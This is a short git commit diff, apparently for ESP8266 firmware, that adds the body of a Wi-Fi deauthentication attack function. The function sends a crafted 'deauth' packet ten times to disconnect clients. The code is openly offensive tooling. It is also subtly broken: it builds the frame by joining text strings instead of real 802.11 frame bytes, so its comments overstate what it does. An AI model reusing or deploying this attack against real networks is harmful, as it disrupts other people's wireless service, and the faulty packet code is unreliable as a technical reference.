338ac557117c0f8ee27b23647a806aed72d075a3
dj1ch <tg.1ch0712@gmail.com>
2023-11-07 21:00:14 -0800

    added deauth implementation

--- ino/deauthAttack.cpp
+++ ino/deauthAttack.cpp
@@ -32,6 +32,19 @@ void DeauthAttack::startRandomDeauth() {
 }
 
 void DeauthAttack::start(bool param1, bool param2, bool param3, bool param4, bool param5, int param6) {
-    // Implementation of the start function
-    // Modify this according to your requirements
+  running = true;
+
+  // Craft and send deauthentication frame
+  String reasonCode = "3"; // 3 corresponds to "Deauthenticated because sending STA is leaving (or has left) BSS"
+  String deauthPacket = "c0:ff:ee:c0:ff:ee" + randomAP + reasonCode;
+  uint8_t* deauthPacketBytes = (uint8_t*)deauthPacket.c_str();
+  int packetSize = deauthPacket.length();
+
+  // Send the deauthentication packet multiple times for a stronger effect
+  for (int i = 0; i < 10; ++i) {
+    wifi_send_pkt_freedom(deauthPacketBytes, packetSize, 0);
+    delay(100);
+  }
+
+  running = false;
 }
